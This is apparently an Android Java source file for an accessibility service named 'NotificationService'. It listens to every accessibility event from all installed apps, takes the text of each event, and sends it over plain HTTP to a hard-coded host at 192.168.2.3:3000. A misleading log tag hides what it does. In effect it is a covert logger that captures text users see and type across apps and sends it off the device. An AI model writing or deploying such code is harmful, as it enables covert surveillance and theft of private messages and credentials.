package com.bitgriff.androidcalls;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class NotificationService extends AccessibilityService {

@Override
public void onAccessibilityEvent(AccessibilityEvent event) {
    // TODO Auto-generated method stub.
	//Code when the event is caught
		String msg = getEventText(event);
		Log.d("error_inmobi","connecting");
		String url = "http://192.168.2.3:3000/test";
        new RequestTask().execute(url,msg);
   }
@Override
public void onInterrupt() {
    // TODO Auto-generated method stub.

}

@Override
protected void onServiceConnected() {
    super.onServiceConnected();
    Log.v("service connected", "onServiceConnected");
    AccessibilityServiceInfo info1 = new AccessibilityServiceInfo();
    info1.flags = AccessibilityServiceInfo.DEFAULT;
    info1.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
    info1.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
    info1.packageNames = null;
    setServiceInfo(info1);
     }
private String getEventText(AccessibilityEvent event) {
    StringBuilder sb = new StringBuilder();
    for (CharSequence s : event.getText()) {
        sb.append(s);
    }
    return sb.toString();
}
}